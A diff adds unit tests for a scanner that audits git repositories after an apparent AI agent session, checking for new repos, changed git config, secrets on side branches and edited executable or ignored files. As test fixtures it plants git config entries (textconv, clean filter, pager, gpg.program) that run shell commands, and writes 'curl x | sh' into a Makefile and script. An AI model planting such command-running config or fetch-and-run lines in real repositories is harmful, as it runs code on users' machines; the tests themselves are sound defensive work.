@@ -87,6 +87,118 @@ class Scan(TempCase):
         self.assertTrue(source.endswith("pre-commit"))
 
 
+class AuditStep5C(TempCase):
+    """docs/reviews/2026-10-01-step-5C.md: H2, H3, M3, M4, M5, L5."""
+
+    def setUp(self):
+        super().setUp()
+        self.repo = self.mkdir("proj")
+        git(self.repo, "init", "-q")
+        self.write("proj/README", "hi\n")
+        self.write("proj/run.sh", "#!/bin/sh\necho ok\n", mode=0o755)
+        self.write("proj/.gitignore", ".envrc\n.venv/\n")
+        git(self.repo, "add", "-A")
+        git(self.repo, "commit", "-qm", "base")
+
+    def test_h2_agent_git_config_never_runs_on_the_host(self):
+        state = scan.snapshot([self.repo])
+        marker = os.path.join(self.tmp, "MARKER")
+        # a repo made during the session, and the session's own repo with a textconv/clean filter config
+        sub = self.mkdir("proj/sub")
+        git(sub, "init", "-q")
+        for r in (sub, self.repo):
+            git(r, "config", "diff.x.textconv", f"sh -c 'touch {marker}; cat'")
+            git(r, "config", "filter.y.clean", f"sh -c 'touch {marker}; cat'")
+            git(r, "config", "core.pager", f"sh -c 'touch {marker}; cat'")
+            git(r, "config", "log.showSignature", "true")
+            git(r, "config", "gpg.program", f"sh -c 'touch {marker}'")
+            with open(os.path.join(r, ".gitattributes"), "w") as f:
+                f.write("* diff=x filter=y\n")
+            with open(os.path.join(r, "f.txt"), "w") as f:
+                f.write("x\n")
+            git(r, "-c", "filter.y.clean=cat", "add", "-A")
+            git(r, "-c", "filter.y.clean=cat", "commit", "-qm", "c")
+        if os.path.exists(marker):
+            os.unlink(marker)
+        summary, text = scan.report(state, [self.repo], regex=REGEX)
+        self.assertFalse(os.path.exists(marker), "the agent's git config ran a command on the host")
+        self.assertTrue(any("NEW GIT REPO" in s and "sub" in s for s in summary), summary)
+        self.assertTrue(any("git config changed" in s for s in summary), summary)
+
+    def test_h2_hardened_git_in_an_unchanged_repo(self):
+        """A repo whose config was already hostile at the start (made in an earlier session) is scanned with
+        textconv, external diff, pager and signature checks off."""
+        marker = os.path.join(self.tmp, "MARKER")
+        git(self.repo, "config", "diff.x.textconv", f"sh -c 'touch {marker}; cat'")
+        git(self.repo, "config", "diff.external", f"sh -c 'touch {marker}'")
+        git(self.repo, "config", "log.showSignature", "true")
+        git(self.repo, "config", "gpg.program", f"sh -c 'touch {marker}'")
+        self.write("proj/.gitattributes", "* diff=x\n")
+        state = scan.snapshot([self.repo])
+        self.write("proj/app.py", f'K = "{FAKE_KEY}"  # scanner:allow\n')
+        git(self.repo, "add", "-A")
+        git(self.repo, "-c", "diff.external=", "-c", "log.showSignature=false", "commit", "-qm", "k")
+        if os.path.exists(marker):
+            os.unlink(marker)
+        summary, _ = scan.report(state, [self.repo], regex=REGEX)
+        self.assertFalse(os.path.exists(marker))
+        self.assertTrue(any("possible secret" in s for s in summary), summary)
+
+    def test_h3_latin1_commit_does_not_break_the_scan(self):
+        state = scan.snapshot([self.repo])
+        with open(os.path.join(self.repo, "latin.txt"), "wb") as f:
+            f.write(b"caf\xe9 " + FAKE_KEY.encode() + b"\n")
+        git(self.repo, "add", "-A")
+        git(self.repo, "commit", "-qm", "latin")
+        summary, _ = scan.report(state, [self.repo], regex=REGEX)
+        self.assertTrue(any("possible secret" in s for s in summary), summary)
+
+    def test_m3_secret_on_another_branch(self):
+        state = scan.snapshot([self.repo])
+        git(self.repo, "checkout", "-qb", "side")
+        self.write("proj/k.py", f'K = "{FAKE_KEY}"  # scanner:allow\n')
+        self.write("proj/Makefile", "all:\n\ttrue\n")
+        git(self.repo, "add", "-A")
+        git(self.repo, "commit", "-qm", "side")
+        git(self.repo, "checkout", "-q", "-")
+        summary, text = scan.report(state, [self.repo], regex=REGEX)
+        self.assertTrue(any("possible secret" in s for s in summary), summary)
+        self.assertIn("changed in the session's commits", text)
+        self.assertIn("  Makefile", text)
+
+    def test_m4_ignored_dirty_and_edited_files(self):
+        self.write("proj/.envrc", "export A=1\n")                      # ignored, present at the start
+        self.write("proj/.venv/lib/python3.12/site-packages/x.pth", "\n")
+        self.write("proj/Makefile", "all:\n")                         # dirty at the start
+        state = scan.snapshot([self.repo])
+        self.write("proj/.envrc", "export A=2\n")
+        self.write("proj/.venv/lib/python3.12/site-packages/x.pth", "import os\n")
+        self.write("proj/Makefile", "all:\n\tcurl x | sh\n")
+        self.write("proj/tests/conftest.py", "import os\n")
+        self.write("proj/.vscode/launch.json", "{}\n")
+        self.write("proj/.github/workflows/ci.yml", "on: push\n")
+        self.write("proj/run.sh", "#!/bin/sh\ncurl x | sh\n", mode=0o755)
+        summary, text = scan.report(state, [self.repo], regex=REGEX)
+        for f in (".envrc", ".venv/lib/python3.12/site-packages/x.pth", "Makefile", "tests/conftest.py",
+                  ".vscode/launch.json", ".github/workflows/ci.yml"):
+            self.assertIn(f"  {f}", text, f)
+        self.assertIn("executable files whose content changed", text)
+        self.assertIn("  run.sh", text)
+
+    def test_l5_mask_skip_is_not_walked(self):
+        self.write("proj/data/big/Makefile", "x\n")
+        skip = {self.repo: ["data"]}
+        state = scan.snapshot([self.repo], skip=skip)
+        self.write("proj/data/big/Makefile", "y\n")
+        _summary, text = scan.report(state, [self.repo], regex=REGEX, skip=skip)
+        self.assertNotIn("data/big/Makefile", text)
+
+    def test_state_is_json(self):
+        import json
+        state = scan.snapshot([self.repo])
+        self.assertEqual(json.loads(json.dumps(state)), state)
+
+
 class NoHook(TempCase):
     def test_without_a_hook_the_secret_scan_says_it_was_skipped(self):
         fake = subprocess.CompletedProcess([], 1, stdout="", stderr="")      # no core.hooksPath
